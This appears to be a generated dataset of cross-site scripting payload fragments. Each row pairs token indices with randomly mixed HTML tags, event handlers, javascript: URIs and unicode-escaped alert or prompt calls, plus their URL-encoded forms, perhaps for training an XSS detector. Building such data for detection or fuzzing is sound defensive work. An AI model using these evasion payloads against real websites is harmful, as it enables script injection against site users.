body_tag,"[23, 10, 4, 64, 63]",</frameset><option/<script al\u0065rt``;\u0061lert``;,%3C/frameset%3E%3Coption/%3Cscript%20al%5Cu0065rt%60%60%3B%5Cu0061lert%60%60%3B
body_tag,"[37, 2, 2, 18, 59]",</embed><video><source <video><source <iframe alert();,%3C/embed%3E%3Cvideo%3E%3Csource%20%3Cvideo%3E%3Csource%20%3Ciframe%20alert%28%29%3B
body_tag,"[20, 5, 51, 65, 25]",</iframe><script/javascript:alert();confirm(1);<svg/,%3C/iframe%3E%3Cscript/javascript%3Aalert%28%29%3Bconfirm%281%29%3B%3Csvg/
body_tag,"[52, 40, 32, 15, 56]",javascript:\u0061lert();src=  <canvas <body/onmouseover=alert();,javascript%3A%5Cu0061lert%28%29%3Bsrc%3D%20%20%3Ccanvas%20%3Cbody/onmouseover%3Dalert%28%29%3B
body_tag,"[51, 19, 6, 1, 1]",javascript:alert();<iframe/<a </script></script>,javascript%3Aalert%28%29%3B%3Ciframe/%3Ca%20%3C/script%3E%3C/script%3E
body_tag,"[67, 51, 4, 61, 36]",>javascript:alert();<script al\u0065rt();<embed/,%3Ejavascript%3Aalert%28%29%3B%3Cscript%20al%5Cu0065rt%28%29%3B%3Cembed/
body_tag,"[9, 13, 47, 64, 55]","<option </img>data=al\u0065rt``;onload=alert();""",%3Coption%20%3C/img%3Edata%3Dal%5Cu0065rt%60%60%3Bonload%3Dalert%28%29%3B%22
body_tag,"[37, 9, 49, 39, 7]",</embed><option onerror=\u0061lert();src=/ <a/,%3C/embed%3E%3Coption%20onerror%3D%5Cu0061lert%28%29%3Bsrc%3D/%20%3Ca/
body_tag,"[55, 18, 31, 65, 64]","onload=alert();""<iframe </select>confirm(1);al\u0065rt``;",onload%3Dalert%28%29%3B%22%3Ciframe%20%3C/select%3Econfirm%281%29%3Bal%5Cu0065rt%60%60%3B
body_tag,"[21, 59, 58, 58, 69]",<frameset><frame alert();saivs.js saivs.js <,%3Cframeset%3E%3Cframe%20alert%28%29%3Bsaivs.js%20saivs.js%20%3C
body_tag,"[38, 36, 0, 8, 64]",src=x <embed/<script></a>al\u0065rt``;,src%3Dx%20%3Cembed/%3Cscript%3E%3C/a%3Eal%5Cu0065rt%60%60%3B
body_tag,"[22, 8, 46, 66, 15]","<frameset><frame/</a>data=""data:text/html,prompt(1);<body/",%3Cframeset%3E%3Cframe/%3C/a%3Edata%3D%22data%3Atext/html%2Cprompt%281%29%3B%3Cbody/
body_tag,"[66, 12, 38, 38, 36]",prompt(1);<img/src=x src=x <embed/,prompt%281%29%3B%3Cimg/src%3Dx%20src%3Dx%20%3Cembed/
body_tag,"[0, 19, 2, 21, 31]",<script><iframe/<video><source <frameset><frame </select>,%3Cscript%3E%3Ciframe/%3Cvideo%3E%3Csource%20%3Cframeset%3E%3Cframe%20%3C/select%3E
body_tag,"[70, 66, 7, 1, 24]","""prompt(1);<a/</script><svg ",%22prompt%281%29%3B%3Ca/%3C/script%3E%3Csvg%20
body_tag,"[37, 18, 31, 28, 15]",</embed><iframe </select></object><body/,%3C/embed%3E%3Ciframe%20%3C/select%3E%3C/object%3E%3Cbody/
body_tag,"[53, 20, 71, 39, 11]",javascript:al\u0065rt();</iframe>'src=/ <img ,javascript%3Aal%5Cu0065rt%28%29%3B%3C/iframe%3E%27src%3D/%20%3Cimg%20
body_tag,"[43, 44, 14, 17, 57]","type=""image"" type=""text/x-scriptlet"" <body <input/onerror=alert();",type%3D%22image%22%20type%3D%22text/x-scriptlet%22%20%3Cbody%20%3Cinput/onerror%3Dalert%28%29%3B
body_tag,"[56, 23, 37, 63, 0]",onmouseover=alert();</frameset></embed>\u0061lert``;<script>,onmouseover%3Dalert%28%29%3B%3C/frameset%3E%3C/embed%3E%5Cu0061lert%60%60%3B%3Cscript%3E
body_tag,"[5, 13, 61, 26, 69]",<script/</img>al\u0065rt();<object <,%3Cscript/%3C/img%3Eal%5Cu0065rt%28%29%3B%3Cobject%20%3C
body_tag,"[3, 22, 45, 51, 14]",<video><source/<frameset><frame/data=saivs.html javascript:alert();<body ,%3Cvideo%3E%3Csource/%3Cframeset%3E%3Cframe/data%3Dsaivs.html%20javascript%3Aalert%28%29%3B%3Cbody%20
body_tag,"[43, 69, 32, 64, 54]","type=""image"" <<canvas al\u0065rt``;onload=alert();",type%3D%22image%22%20%3C%3Ccanvas%20al%5Cu0065rt%60%60%3Bonload%3Dalert%28%29%3B
body_tag,"[66, 10, 32, 70, 63]","prompt(1);<option/<canvas ""\u0061lert``;",prompt%281%29%3B%3Coption/%3Ccanvas%20%22%5Cu0061lert%60%60%3B
body_tag,"[9, 13, 47, 64, 55]","<option </img>data=al\u0065rt``;onload=alert();""",%3Coption%20%3C/img%3Edata%3Dal%5Cu0065rt%60%60%3Bonload%3Dalert%28%29%3B%22
body_tag,"[37, 9, 49, 39, 7]",</embed><option onerror=\u0061lert();src=/ <a/,%3C/embed%3E%3Coption%20onerror%3D%5Cu0061lert%28%29%3Bsrc%3D/%20%3Ca/
body_tag,"[71, 52, 35, 70, 52]","'javascript:\u0061lert();<embed ""javascript:\u0061lert();",%27javascript%3A%5Cu0061lert%28%29%3B%3Cembed%20%22javascript%3A%5Cu0061lert%28%29%3B
body_tag,"[15, 31, 29, 23, 71]",<body/</select><select </frameset>',%3Cbody/%3C/select%3E%3Cselect%20%3C/frameset%3E%27
body_tag,"[15, 31, 29, 23, 71]",<body/</select><select </frameset>',%3Cbody/%3C/select%3E%3Cselect%20%3C/frameset%3E%27
body_tag,"[3, 22, 45, 51, 14]",<video><source/<frameset><frame/data=saivs.html javascript:alert();<body ,%3Cvideo%3E%3Csource/%3Cframeset%3E%3Cframe/data%3Dsaivs.html%20javascript%3Aalert%28%29%3B%3Cbody%20
body_tag,"[43, 69, 32, 64, 54]","type=""image"" <<canvas al\u0065rt``;onload=alert();",type%3D%22image%22%20%3C%3Ccanvas%20al%5Cu0065rt%60%60%3Bonload%3Dalert%28%29%3B
body_tag,"[66, 10, 32, 70, 63]","prompt(1);<option/<canvas ""\u0061lert``;",prompt%281%29%3B%3Coption/%3Ccanvas%20%22%5Cu0061lert%60%60%3B
body_tag,"[9, 13, 47, 64, 55]","<option </img>data=al\u0065rt``;onload=alert();""",%3Coption%20%3C/img%3Edata%3Dal%5Cu0065rt%60%60%3Bonload%3Dalert%28%29%3B%22
body_tag,"[37, 9, 49, 39, 7]",</embed><option onerror=\u0061lert();src=/ <a/,%3C/embed%3E%3Coption%20onerror%3D%5Cu0061lert%28%29%3Bsrc%3D/%20%3Ca/
body_tag,"[71, 52, 35, 70, 52]","'javascript:\u0061lert();<embed ""javascript:\u0061lert();",%27javascript%3A%5Cu0061lert%28%29%3B%3Cembed%20%22javascript%3A%5Cu0061lert%28%29%3B
body_tag,"[45, 66, 41, 43, 10]","data=saivs.html prompt(1);src=""data:text/html,type=""image"" <option/",data%3Dsaivs.html%20prompt%281%29%3Bsrc%3D%22data%3Atext/html%2Ctype%3D%22image%22%20%3Coption/
body_tag,"[39, 49, 21, 71, 74]",src=/ onerror=\u0061lert();<frameset><frame ' ,src%3D/%20onerror%3D%5Cu0061lert%28%29%3B%3Cframeset%3E%3Cframe%20%27%20
body_tag,"[22, 43, 37, 13, 32]","<frameset><frame/type=""image"" </embed></img><canvas ",%3Cframeset%3E%3Cframe/type%3D%22image%22%20%3C/embed%3E%3C/img%3E%3Ccanvas%20
body_tag,"[52, 40, 32, 15, 56]",javascript:\u0061lert();src=  <canvas <body/onmouseover=alert();,javascript%3A%5Cu0061lert%28%29%3Bsrc%3D%20%20%3Ccanvas%20%3Cbody/onmouseover%3Dalert%28%29%3B
body_tag,"[38, 36, 0, 8, 64]",src=x <embed/<script></a>al\u0065rt``;,src%3Dx%20%3Cembed/%3Cscript%3E%3C/a%3Eal%5Cu0065rt%60%60%3B
body_tag,"[23, 12, 29, 11, 25]",</frameset><img/<select <img <svg/,%3C/frameset%3E%3Cimg/%3Cselect%20%3Cimg%20%3Csvg/
body_tag,"[3, 15, 54, 47, 33]",<video><source/<body/onload=alert();data=<canvas/,%3Cvideo%3E%3Csource/%3Cbody/onload%3Dalert%28%29%3Bdata%3D%3Ccanvas/
body_tag,"[17, 15, 37, 4, 2]",<input/<body/</embed><script <video><source ,%3Cinput/%3Cbody/%3C/embed%3E%3Cscript%20%3Cvideo%3E%3Csource%20
body_tag,"[43, 10, 0, 51, 4]","type=""image"" <option/<script>javascript:alert();<script ",type%3D%22image%22%20%3Coption/%3Cscript%3Ejavascript%3Aalert%28%29%3B%3Cscript%20
body_tag,"[17, 42, 6, 8, 45]",<input/src=saivs.js <a </a>data=saivs.html ,%3Cinput/src%3Dsaivs.js%20%3Ca%20%3C/a%3Edata%3Dsaivs.html%20
body_tag,"[22, 8, 46, 66, 15]","<frameset><frame/</a>data=""data:text/html,prompt(1);<body/",%3Cframeset%3E%3Cframe/%3C/a%3Edata%3D%22data%3Atext/html%2Cprompt%281%29%3B%3Cbody/
body_tag,"[74, 49, 6, 11, 26]", onerror=\u0061lert();<a <img <object ,%20onerror%3D%5Cu0061lert%28%29%3B%3Ca%20%3Cimg%20%3Cobject%20
body_tag,"[29, 0, 4, 61, 40]",<select <script><script al\u0065rt();src=  ,%3Cselect%20%3Cscript%3E%3Cscript%20al%5Cu0065rt%28%29%3Bsrc%3D%20%20
body_tag,"[29, 21, 29, 59, 40]",<select <frameset><frame <select alert();src=  ,%3Cselect%20%3Cframeset%3E%3Cframe%20%3Cselect%20alert%28%29%3Bsrc%3D%20%20
body_tag,"[39, 31, 28, 59, 71]",src=/ </select></object>alert();',src%3D/%20%3C/select%3E%3C/object%3Ealert%28%29%3B%27
body_tag,"[3, 31, 29, 23, 71]",<video><source/</select><select </frameset>',%3Cvideo%3E%3Csource/%3C/select%3E%3Cselect%20%3C/frameset%3E%27
body_tag,"[2, 62, 10, 32, 51]",<video><source alert``;<option/<canvas javascript:alert();,%3Cvideo%3E%3Csource%20alert%60%60%3B%3Coption/%3Ccanvas%20javascript%3Aalert%28%29%3B
body_tag,"[3, 22, 45, 51, 14]",<video><source/<frameset><frame/data=saivs.html javascript:alert();<body ,%3Cvideo%3E%3Csource/%3Cframeset%3E%3Cframe/data%3Dsaivs.html%20javascript%3Aalert%28%29%3B%3Cbody%20
body_tag,"[16, 22, 74, 48, 45]",<input <frameset><frame/ onerror=javascript:alert();data=saivs.html ,%3Cinput%20%3Cframeset%3E%3Cframe/%20onerror%3Djavascript%3Aalert%28%29%3Bdata%3Dsaivs.html%20
body_tag,"[16, 22, 74, 48, 45]",<input <frameset><frame/ onerror=javascript:alert();data=saivs.html ,%3Cinput%20%3Cframeset%3E%3Cframe/%20onerror%3Djavascript%3Aalert%28%29%3Bdata%3Dsaivs.html%20
body_tag,"[23, 10, 4, 64, 63]",</frameset><option/<script al\u0065rt``;\u0061lert``;,%3C/frameset%3E%3Coption/%3Cscript%20al%5Cu0065rt%60%60%3B%5Cu0061lert%60%60%3B
body_tag,"[46, 31, 29, 3, 46]","data=""data:text/html,</select><select <video><source/data=""data:text/html,",data%3D%22data%3Atext/html%2C%3C/select%3E%3Cselect%20%3Cvideo%3E%3Csource/data%3D%22data%3Atext/html%2C
body_tag,"[2, 24, 23, 34, 56]",<video><source <svg </frameset></canvas>onmouseover=alert();,%3Cvideo%3E%3Csource%20%3Csvg%20%3C/frameset%3E%3C/canvas%3Eonmouseover%3Dalert%28%29%3B
body_tag,"[29, 13, 18, 20, 7]",<select </img><iframe </iframe><a/,%3Cselect%20%3C/img%3E%3Ciframe%20%3C/iframe%3E%3Ca/
body_tag,"[37, 9, 49, 39, 55]","</embed><option onerror=\u0061lert();src=/ onload=alert();""",%3C/embed%3E%3Coption%20onerror%3D%5Cu0061lert%28%29%3Bsrc%3D/%20onload%3Dalert%28%29%3B%22
body_tag,"[21, 9, 49, 39, 7]",<frameset><frame <option onerror=\u0061lert();src=/ <a/,%3Cframeset%3E%3Cframe%20%3Coption%20onerror%3D%5Cu0061lert%28%29%3Bsrc%3D/%20%3Ca/
body_tag,"[37, 59, 58, 58, 69]",</embed>alert();saivs.js saivs.js <,%3C/embed%3Ealert%28%29%3Bsaivs.js%20saivs.js%20%3C
body_tag,"[54, 72, 47, 54, 12]",onload=alert();#data=onload=alert();<img/,onload%3Dalert%28%29%3B%23data%3Donload%3Dalert%28%29%3B%3Cimg/
body_tag,"[57, 52, 27, 21, 39]",onerror=alert();javascript:\u0061lert();<object/<frameset><frame src=/ ,onerror%3Dalert%28%29%3Bjavascript%3A%5Cu0061lert%28%29%3B%3Cobject/%3Cframeset%3E%3Cframe%20src%3D/%20
body_tag,"[6, 44, 1, 35, 5]","<a type=""text/x-scriptlet"" </script><embed <script/",%3Ca%20type%3D%22text/x-scriptlet%22%20%3C/script%3E%3Cembed%20%3Cscript/
body_tag,"[50, 33, 70, 25, 46]","onerror=al\u0065rt();<canvas/""<svg/data=""data:text/html,",onerror%3Dal%5Cu0065rt%28%29%3B%3Ccanvas/%22%3Csvg/data%3D%22data%3Atext/html%2C
body_tag,"[6, 28, 4, 37, 74]",<a </object><script </embed> ,%3Ca%20%3C/object%3E%3Cscript%20%3C/embed%3E%20
body_tag,"[60, 31, 64, 69, 41]","\u0061lert();</select>al\u0065rt``;<src=""data:text/html,",%5Cu0061lert%28%29%3B%3C/select%3Eal%5Cu0065rt%60%60%3B%3Csrc%3D%22data%3Atext/html%2C
body_tag,"[55, 6, 17, 44, 68]","onload=alert();""<a <input/type=""text/x-scriptlet""  />",onload%3Dalert%28%29%3B%22%3Ca%20%3Cinput/type%3D%22text/x-scriptlet%22%20%20/%3E
body_tag,"[39, 40, 10, 40, 43]","src=/ src=  <option/src=  type=""image"" ",src%3D/%20src%3D%20%20%3Coption/src%3D%20%20type%3D%22image%22%20
body_tag,"[23, 51, 50, 25, 24]",</frameset>javascript:alert();onerror=al\u0065rt();<svg/<svg ,%3C/frameset%3Ejavascript%3Aalert%28%29%3Bonerror%3Dal%5Cu0065rt%28%29%3B%3Csvg/%3Csvg%20
body_tag,"[2, 56, 33, 29, 3]",<video><source onmouseover=alert();<canvas/<select <video><source/,%3Cvideo%3E%3Csource%20onmouseover%3Dalert%28%29%3B%3Ccanvas/%3Cselect%20%3Cvideo%3E%3Csource/
body_tag,"[18, 3, 49, 57, 31]",<iframe <video><source/onerror=\u0061lert();onerror=alert();</select>,%3Ciframe%20%3Cvideo%3E%3Csource/onerror%3D%5Cu0061lert%28%29%3Bonerror%3Dalert%28%29%3B%3C/select%3E
body_tag,"[44, 59, 18, 66, 19]","type=""text/x-scriptlet"" alert();<iframe prompt(1);<iframe/",type%3D%22text/x-scriptlet%22%20alert%28%29%3B%3Ciframe%20prompt%281%29%3B%3Ciframe/
body_tag,"[10, 27, 45, 24, 29]",<option/<object/data=saivs.html <svg <select ,%3Coption/%3Cobject/data%3Dsaivs.html%20%3Csvg%20%3Cselect%20
body_tag,"[59, 65, 23, 47, 65]",alert();confirm(1);</frameset>data=confirm(1);,alert%28%29%3Bconfirm%281%29%3B%3C/frameset%3Edata%3Dconfirm%281%29%3B
body_tag,"[23, 24, 45, 59, 47]",</frameset><svg data=saivs.html alert();data=,%3C/frameset%3E%3Csvg%20data%3Dsaivs.html%20alert%28%29%3Bdata%3D
body_tag,"[4, 39, 55, 22, 40]","<script src=/ onload=alert();""<frameset><frame/src=  ",%3Cscript%20src%3D/%20onload%3Dalert%28%29%3B%22%3Cframeset%3E%3Cframe/src%3D%20%20
body_tag,"[10, 2, 66, 39, 50]",<option/<video><source prompt(1);src=/ onerror=al\u0065rt();,%3Coption/%3Cvideo%3E%3Csource%20prompt%281%29%3Bsrc%3D/%20onerror%3Dal%5Cu0065rt%28%29%3B
body_tag,"[26, 2, 17, 9, 71]",<object <video><source <input/<option ',%3Cobject%20%3Cvideo%3E%3Csource%20%3Cinput/%3Coption%20%27
body_tag,"[35, 67, 64, 65, 8]",<embed >al\u0065rt``;confirm(1);</a>,%3Cembed%20%3Eal%5Cu0065rt%60%60%3Bconfirm%281%29%3B%3C/a%3E
body_tag,"[11, 23, 40, 50, 49]",<img </frameset>src=  onerror=al\u0065rt();onerror=\u0061lert();,%3Cimg%20%3C/frameset%3Esrc%3D%20%20onerror%3Dal%5Cu0065rt%28%29%3Bonerror%3D%5Cu0061lert%28%29%3B
body_tag,"[47, 54, 73, 10, 15]",data=onload=alert();/<option/<body/,data%3Donload%3Dalert%28%29%3B/%3Coption/%3Cbody/
body_tag,"[57, 72, 36, 44, 38]","onerror=alert();#<embed/type=""text/x-scriptlet"" src=x ",onerror%3Dalert%28%29%3B%23%3Cembed/type%3D%22text/x-scriptlet%22%20src%3Dx%20
body_tag,"[16, 49, 20, 11, 74]",<input onerror=\u0061lert();</iframe><img  ,%3Cinput%20onerror%3D%5Cu0061lert%28%29%3B%3C/iframe%3E%3Cimg%20%20
body_tag,"[69, 73, 15, 28, 37]",</<body/</object></embed>,%3C/%3Cbody/%3C/object%3E%3C/embed%3E
body_tag,"[23, 24, 25, 40, 18]",</frameset><svg <svg/src=  <iframe ,%3C/frameset%3E%3Csvg%20%3Csvg/src%3D%20%20%3Ciframe%20
body_tag,"[63, 46, 41, 9, 73]","\u0061lert``;data=""data:text/html,src=""data:text/html,<option /",%5Cu0061lert%60%60%3Bdata%3D%22data%3Atext/html%2Csrc%3D%22data%3Atext/html%2C%3Coption%20/
body_tag,"[30, 34, 15, 27, 41]","<select/</canvas><body/<object/src=""data:text/html,",%3Cselect/%3C/canvas%3E%3Cbody/%3Cobject/src%3D%22data%3Atext/html%2C
body_tag,"[60, 16, 71, 47, 28]",\u0061lert();<input 'data=</object>,%5Cu0061lert%28%29%3B%3Cinput%20%27data%3D%3C/object%3E
body_tag,"[73, 6, 64, 14, 25]",/<a al\u0065rt``;<body <svg/,/%3Ca%20al%5Cu0065rt%60%60%3B%3Cbody%20%3Csvg/
body_tag,"[47, 22, 25, 18, 40]",data=<frameset><frame/<svg/<iframe src=  ,data%3D%3Cframeset%3E%3Cframe/%3Csvg/%3Ciframe%20src%3D%20%20
body_tag,"[45, 31, 13, 41, 59]","data=saivs.html </select></img>src=""data:text/html,alert();",data%3Dsaivs.html%20%3C/select%3E%3C/img%3Esrc%3D%22data%3Atext/html%2Calert%28%29%3B
body_tag,"[11, 23, 40, 50, 49]",<img </frameset>src=  onerror=al\u0065rt();onerror=\u0061lert();,%3Cimg%20%3C/frameset%3Esrc%3D%20%20onerror%3Dal%5Cu0065rt%28%29%3Bonerror%3D%5Cu0061lert%28%29%3B
body_tag,"[23, 24, 45, 59, 47]",</frameset><svg data=saivs.html alert();data=,%3C/frameset%3E%3Csvg%20data%3Dsaivs.html%20alert%28%29%3Bdata%3D
body_tag,"[11, 23, 40, 50, 49]",<img </frameset>src=  onerror=al\u0065rt();onerror=\u0061lert();,%3Cimg%20%3C/frameset%3Esrc%3D%20%20onerror%3Dal%5Cu0065rt%28%29%3Bonerror%3D%5Cu0061lert%28%29%3B
body_tag,"[55, 6, 17, 44, 68]","onload=alert();""<a <input/type=""text/x-scriptlet""  />",onload%3Dalert%28%29%3B%22%3Ca%20%3Cinput/type%3D%22text/x-scriptlet%22%20%20/%3E
body_tag,"[39, 40, 10, 40, 43]","src=/ src=  <option/src=  type=""image"" ",src%3D/%20src%3D%20%20%3Coption/src%3D%20%20type%3D%22image%22%20
body_tag,"[55, 6, 17, 44, 68]","onload=alert();""<a <input/type=""text/x-scriptlet""  />",onload%3Dalert%28%29%3B%22%3Ca%20%3Cinput/type%3D%22text/x-scriptlet%22%20%20/%3E
body_tag,"[39, 40, 10, 40, 43]","src=/ src=  <option/src=  type=""image"" ",src%3D/%20src%3D%20%20%3Coption/src%3D%20%20type%3D%22image%22%20
body_tag,"[44, 59, 18, 66, 19]","type=""text/x-scriptlet"" alert();<iframe prompt(1);<iframe/",type%3D%22text/x-scriptlet%22%20alert%28%29%3B%3Ciframe%20prompt%281%29%3B%3Ciframe/
body_tag,"[21, 7, 43, 45, 7]","<frameset><frame <a/type=""image"" data=saivs.html <a/",%3Cframeset%3E%3Cframe%20%3Ca/type%3D%22image%22%20data%3Dsaivs.html%20%3Ca/
body_tag,"[44, 59, 18, 66, 19]","type=""text/x-scriptlet"" alert();<iframe prompt(1);<iframe/",type%3D%22text/x-scriptlet%22%20alert%28%29%3B%3Ciframe%20prompt%281%29%3B%3Ciframe/
body_tag,"[72, 34, 35, 10, 60]",#</canvas><embed <option/\u0061lert();,%23%3C/canvas%3E%3Cembed%20%3Coption/%5Cu0061lert%28%29%3B
body_tag,"[15, 23, 6, 52, 37]",<body/</frameset><a javascript:\u0061lert();</embed>,%3Cbody/%3C/frameset%3E%3Ca%20javascript%3A%5Cu0061lert%28%29%3B%3C/embed%3E
body_tag,"[13, 10, 18, 59, 35]",</img><option/<iframe alert();<embed ,%3C/img%3E%3Coption/%3Ciframe%20alert%28%29%3B%3Cembed%20
body_tag,"[65, 17, 46, 64, 61]","confirm(1);<input/data=""data:text/html,al\u0065rt``;al\u0065rt();",confirm%281%29%3B%3Cinput/data%3D%22data%3Atext/html%2Cal%5Cu0065rt%60%60%3Bal%5Cu0065rt%28%29%3B
body_tag,"[15, 9, 64, 38, 70]","<body/<option al\u0065rt``;src=x """,%3Cbody/%3Coption%20al%5Cu0065rt%60%60%3Bsrc%3Dx%20%22
body_tag,"[49, 51, 14, 31, 13]",onerror=\u0061lert();javascript:alert();<body </select></img>,onerror%3D%5Cu0061lert%28%29%3Bjavascript%3Aalert%28%29%3B%3Cbody%20%3C/select%3E%3C/img%3E
body_tag,"[56, 51, 2, 64, 41]","onmouseover=alert();javascript:alert();<video><source al\u0065rt``;src=""data:text/html,",onmouseover%3Dalert%28%29%3Bjavascript%3Aalert%28%29%3B%3Cvideo%3E%3Csource%20al%5Cu0065rt%60%60%3Bsrc%3D%22data%3Atext/html%2C
body_tag,"[0, 40, 68, 73, 20]",<script>src=   />/</iframe>,%3Cscript%3Esrc%3D%20%20%20/%3E/%3C/iframe%3E
body_tag,"[68, 9, 34, 37, 32]", /><option </canvas></embed><canvas ,%20/%3E%3Coption%20%3C/canvas%3E%3C/embed%3E%3Ccanvas%20
body_tag,"[73, 64, 20, 32, 32]",/al\u0065rt``;</iframe><canvas <canvas ,/al%5Cu0065rt%60%60%3B%3C/iframe%3E%3Ccanvas%20%3Ccanvas%20
body_tag,"[48, 39, 1, 69, 10]",onerror=javascript:alert();src=/ </script><<option/,onerror%3Djavascript%3Aalert%28%29%3Bsrc%3D/%20%3C/script%3E%3C%3Coption/
body_tag,"[24, 55, 53, 35, 3]","<svg onload=alert();""javascript:al\u0065rt();<embed <video><source/",%3Csvg%20onload%3Dalert%28%29%3B%22javascript%3Aal%5Cu0065rt%28%29%3B%3Cembed%20%3Cvideo%3E%3Csource/
body_tag,"[41, 13, 25, 45, 18]","src=""data:text/html,</img><svg/data=saivs.html <iframe ",src%3D%22data%3Atext/html%2C%3C/img%3E%3Csvg/data%3Dsaivs.html%20%3Ciframe%20
body_tag,"[21, 51, 15, 70, 68]","<frameset><frame javascript:alert();<body/"" />",%3Cframeset%3E%3Cframe%20javascript%3Aalert%28%29%3B%3Cbody/%22%20/%3E
body_tag,"[3, 2, 8, 35, 64]",<video><source/<video><source </a><embed al\u0065rt``;,%3Cvideo%3E%3Csource/%3Cvideo%3E%3Csource%20%3C/a%3E%3Cembed%20al%5Cu0065rt%60%60%3B
body_tag,"[60, 66, 71, 49, 39]",\u0061lert();prompt(1);'onerror=\u0061lert();src=/ ,%5Cu0061lert%28%29%3Bprompt%281%29%3B%27onerror%3D%5Cu0061lert%28%29%3Bsrc%3D/%20
body_tag,"[43, 50, 14, 3, 34]","type=""image"" onerror=al\u0065rt();<body <video><source/</canvas>",type%3D%22image%22%20onerror%3Dal%5Cu0065rt%28%29%3B%3Cbody%20%3Cvideo%3E%3Csource/%3C/canvas%3E
body_tag,"[69, 65, 14, 70, 4]","<confirm(1);<body ""<script ",%3Cconfirm%281%29%3B%3Cbody%20%22%3Cscript%20
body_tag,"[8, 20, 6, 22, 15]",</a></iframe><a <frameset><frame/<body/,%3C/a%3E%3C/iframe%3E%3Ca%20%3Cframeset%3E%3Cframe/%3Cbody/
body_tag,"[4, 10, 21, 37, 30]",<script <option/<frameset><frame </embed><select/,%3Cscript%20%3Coption/%3Cframeset%3E%3Cframe%20%3C/embed%3E%3Cselect/
